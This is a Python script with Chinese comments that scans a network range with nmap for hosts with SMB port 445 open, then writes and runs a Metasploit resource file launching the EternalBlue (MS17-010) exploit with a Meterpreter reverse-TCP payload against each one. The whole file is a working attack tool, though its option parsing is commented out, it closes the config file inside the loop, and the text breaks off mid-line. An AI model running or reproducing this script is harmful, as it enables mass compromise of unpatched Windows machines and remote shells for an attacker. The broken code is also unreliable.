# -*- coding: utf-8 -*-
"""
Created on Sun Nov  12 09:11:33 2018
@author: 小謝
"""
import os
import optparse
import sys
import nmap
def findTarget(Hosts):              #掃描網段範圍內開放445埠的主機
    nmScan=nmap.PortScanner()
    nmScan.scan(Hosts,'445')
    targets=[]
    for t in nmScan.all_hosts():
        if nmScan[t].has_tcp(445):  #如果445埠提供了協議
            state=nmScan[t]['tcp'][445]['state']  #檢視445埠的狀態
            if state=='open':
                print('[+]Found Target Host:'+t)
                targets.append(t) 
    return targets         #返回開放445埠的主機列表
def confickerExploit(configFile,target,lhost):       #漏洞利用
    configFile.write('use exploit/windows/smb/ms17_010_eternalblue \n')  #漏洞利用程式碼
    configFile.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp\n')
    configFile.write('set RHOST '+str(target)+'\n')              #設定引數
    configFile.write('set LHOST '+lhost+'\n')
    configFile.write('exploit\n')
    configFile.write('ls\n')      #j選項是將所有連線的會話保持在後臺 -z不與任務進行即時交換
def main():
    configFile=open('configure.rc','w')  #以寫入方式開啟配置檔案
    usage='[-]Usage %prog -H <RHOSTS> -l/-L <LHOST> '
    parser=optparse.OptionParser(usage)
    # parser.add_option('-H',dest='target',type='string',help='target host')           #目標主機
    # parser.add_option('-l','-L',dest='lhost',type='string',help='listen address')    #我們的主機
    (options,args)=parser.parse_args()
    target=options.target
    lhost=options.lhost
    if (target==None)|(lhost==None):
        print(parser.usage)
        exit(0)
    targets=findTarget(options.target)           #尋找目標
    for target in targets:                       #逐個攻擊
        confickerExploit(configFile,target,lhost)
        configFile.close()
        os.system('msfconsole -r configure.rc')  #啟動metasploit並讀取配置檔案
if __name__=='__main__':
    co